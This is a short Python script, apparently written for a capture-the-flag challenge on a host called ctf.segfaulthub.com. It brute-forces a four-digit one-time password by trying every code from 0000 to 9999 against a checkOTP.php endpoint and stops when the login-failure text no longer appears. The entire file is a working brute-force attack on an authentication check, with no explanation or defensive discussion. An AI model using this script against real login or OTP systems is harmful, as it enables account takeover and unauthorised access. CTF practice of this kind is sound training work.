import requests

print("[*] Password Crack Start...")

for i in range(0, 10000):
    tryNum = str(i).zfill(4)
    print(f"[>] Try : [{tryNum}]", end="\r")
    response = requests.get(f"http://ctf.segfaulthub.com:1129/6/checkOTP.php?otpNum={tryNum}")
    
    if 'Login Fail...' not in response.text:
        print(f"[+] Found Code : {tryNum}")
        break
